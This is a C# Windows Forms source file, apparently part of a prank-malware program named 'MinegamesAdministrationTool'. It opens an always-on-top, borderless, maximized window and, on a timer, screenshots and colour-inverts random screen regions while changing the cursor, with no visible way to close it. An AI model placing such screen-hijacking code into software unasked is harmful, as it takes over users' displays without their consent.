using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace MinegamesAdministrationTool
{
    public partial class Form6 : Form
    {
        public Form6()
        {
            InitializeComponent();
            this.TransparencyKey = this.BackColor;
        }

        public static Cursor CreateCursor(Bitmap bm, Size size)
        {
            bm = new Bitmap(bm, size);
            return new Cursor(bm.GetHicon()); //get cursor icon
        }
        private void Form6_Load(object sender, EventArgs e)
        {
            timer1.Enabled = true;
            timer1.Start();

            this.TopMost = true;
            this.FormBorderStyle = FormBorderStyle.None;
            this.WindowState = FormWindowState.Maximized;//form borderless,top,maximized
            pictureBox2.SizeMode = PictureBoxSizeMode.StretchImage; //resize image to fit error icon
        }

        private void timer1_Tick(object sender, EventArgs e)
        {


            Random random = new Random();//random class
            int num = random.Next(0, 150);
            int num1 = random.Next(0, 150);
            int num2 = random.Next(0, 150);
            int num3 = random.Next(0, 150);
            //random numbers
            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Width);
            Graphics g = Graphics.FromImage(bmp);
            g.CopyFromScreen(num, num3, num1, num2, bmp.Size);
            g.CopyFromScreen(num3, num2, num, num1, bmp.Size);
            //get screenshot
            int width = random.Next(500, 1500);
            int height = random.Next(250, 800);

            for (int y = 0; y < height; y++)
            {
                for (int x = 0; x < width; x++)
                {

                    Color p = bmp.GetPixel(x, y);


                    int a = p.A;
                    int r = p.R;
                    int gr = p.G;
                    int b = p.B;


                    r = 255 - r;
                    gr = 255 - gr;
                    b = 255 - b;


                    bmp.SetPixel(x, y, Color.FromArgb(a, r, gr, b));

                }
                pictureBox2.Location = Cursor.Position;
                pictureBox1.Image = bmp;


            }
            this.Cursor = CreateCursor((Bitmap)imageList1.Images[0], new Size(32, 32));

        }

    }

}
